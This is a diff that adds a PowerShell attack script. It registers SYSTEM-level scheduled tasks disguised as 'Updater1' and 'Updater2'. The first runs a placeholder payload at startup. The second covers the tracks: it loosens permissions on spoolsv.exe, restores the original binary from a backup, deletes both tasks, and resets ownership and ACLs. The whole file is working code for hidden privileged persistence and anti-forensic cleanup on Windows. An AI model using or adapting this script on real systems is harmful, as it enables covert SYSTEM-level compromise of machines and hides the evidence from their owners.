@@ -1,0 +1,16 @@
+$A = New-ScheduledTaskAction -Execute 'powershell' -Argument "-command Start-Sleep -Seconds 80; <PAYLOAD>"; 
+$T = New-ScheduledTaskTrigger -AtStartup; 
+Register-ScheduledTask -Action $A -Trigger $T -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -TaskName 'Updater1'; 
+
+
+
+#Creates scheduled tasks and cleans up after executing.
+$A2 = New-ScheduledTaskAction -Execute 'powershell' -Argument "-command Start-Sleep -Seconds 120; `$username = 'Everyone'; `$path = 'C:\Windows\System32\spoolsv.exe'; `$acl = (Get-Item `$path).GetAccessControl('Access'); `$aclrule = New-Object system.security.AccessControl.FileSystemAccessRule(`$username, 'FullControl', 'None', 'None', 'Allow'); `$acl.AddAccessRule(`$aclrule); set-acl -aclobject `$acl `$path; Remove-Item C:\windows\system32\spoolsv.exe; Copy-Item C:\Windows\System32\spoolsv.exe.bak C:\Windows\System32\spoolsv.exe; Remove-Item C:\Windows\System32\spoolsv.exe.bak; schtasks /delete /F /tn Updater1; schtasks /delete /F /tn Updater2; [System.Security.Principal.NTAccount]`$TrustedInstaller = 'NT SERVICE\TrustedInstaller'; `$acl.SetOwner(`$TrustedInstaller); Set-Acl -Path `$path -AclObject `$acl; `$acl = Get-Acl `$path; `$sys = 'NT Authority\SYSTEM'; `$aclrule = New-Object system.security.AccessControl.FileSystemAccessRule(`$sys, 'ReadAndexecute', 'None', 'None', 'Allow'); `$acl.SetAccessRule(`$aclRule); Set-Acl -Path `$path -AclObject `$acl; `$aclrule = New-Object system.security.AccessControl.FileSystemAccessRule('Everyone', 'FullControl', 'None', 'None', 'Allow'); $acl = Get-Acl `$path; `$acl.RemoveAccessRule(`$aclRule); Set-Acl -Path `$path -AclObject `$acl;
+ sc start spooler"
+
+$T2 = New-ScheduledTaskTrigger -AtStartup;
+Register-ScheduledTask -Action $A2 -Trigger $T2 -User 'NT AUTHORITY\SYSTEM' -RunLevel Highest -Force -TaskName 'Updater2';
+
+Start-ScheduledTask -TaskName 'Updater1';
+Start-ScheduledTask -TaskName 'Updater2';
+
